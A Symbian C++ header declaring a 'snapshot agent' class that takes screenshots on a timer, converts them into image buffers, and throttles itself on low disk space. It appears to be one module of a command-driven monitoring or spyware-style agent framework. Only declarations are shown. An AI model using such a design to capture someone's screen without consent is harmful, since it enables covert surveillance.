/*
 * AgentSnapshot.h
 *
 *  Created on: 05/ago/2010
 *      Author: Giovanna
 */

#ifndef AGENTSNAPSHOT_H_
#define AGENTSNAPSHOT_H_

// INCLUDES
#include <W32STD.H>
#include <e32std.h>
#include <e32base.h>

#include "AbstractAgent.h"
#include "AdditionalDataStructs.h"
#include "MonitorFreeSpace.h"

#include <HT\TimeOutTimer.h>

// CLASS DECLARATION

/**
 *  CAgentSnapshot
 * 
 */
class CAgentSnapshot : public CAbstractAgent, public MTimeOutNotifier, public MFreeSpaceCallBack
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentSnapshot();

	/**
	 * Two-phased constructor.
	 */
	static CAgentSnapshot* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentSnapshot* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);

    // From MFreeSpaceCallBack
    virtual void NotifyAboveThreshold();
    virtual void NotifyBelowThreshold();
    	
    // Capture the image into mbm format
    void DoCaptureL();
    
    // Convert the image into the required format and put it into a buffer
    HBufC8* GetImageBufferL();

	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentSnapshot();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CTimeOutTimer* iTimer;
	TTimeIntervalSeconds iSecondsInterv;
	RWsSession	iWsSession;
	CWsScreenDevice* iScreenDevice;
	CFbsBitmap*          iBitmap;
	TBool   iCapturedScreen;
	
	CFreeSpaceMonitor*		iFreeSpaceMonitor;
	TBool  iBelowQuota;
		
	};


#endif /* AGENTSNAPSHOT_H_ */
